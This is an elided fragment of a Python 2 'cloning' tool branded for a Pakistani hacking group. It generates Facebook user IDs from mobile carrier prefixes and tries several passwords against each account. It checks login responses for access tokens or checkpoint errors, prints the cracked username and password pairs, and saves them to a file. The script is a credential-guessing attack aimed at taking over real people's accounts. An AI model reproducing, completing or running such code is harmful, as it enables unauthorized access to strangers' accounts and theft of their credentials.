...
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
\033[1;96m -\x1b[1;93mCyber OF B4LOCH Pakistan
\033[1;97m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••      
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[A]\x1b[1;92mSTART ( \033[1;92m NOW)"
    time.sleep(0.05)
    print "\033[1;95m[B]\x1b[1;92mUPDATE (9.0)"
    time.sleep(0.05)
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[A]  START CLONING'
    time.sleep(0.10)
    print '\x1b[1;92m[B] ERRO'
    time.sleep(0.10)
    print '\x1b[1;93m[C] ERRO'
    time.sleep(0.10)
    print '\x1b[1;93m[D]LD BOLANI'
    time.sleep(0.10)
    print '\x1b[1;92m[E] CLONING ERROR'
    time.sleep(0.10)
...
def action():
    ...
    if peak =='':
        ...
        print '\x1b[1;94mEnter any code 01 to 49'
        print '\x1b[1;94mtelenor.\x1b[1;91mjazz.\x1b[1;94mzong.\x1b[1;94mwarid.UFUNE'
        try:
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(\x1b[1;94mBOLANI_CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(\x1b[1;94mBOLANI_CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m\x1b[1;94m( BOLANI_CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m\x1b[1;94m(BOLANI_CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
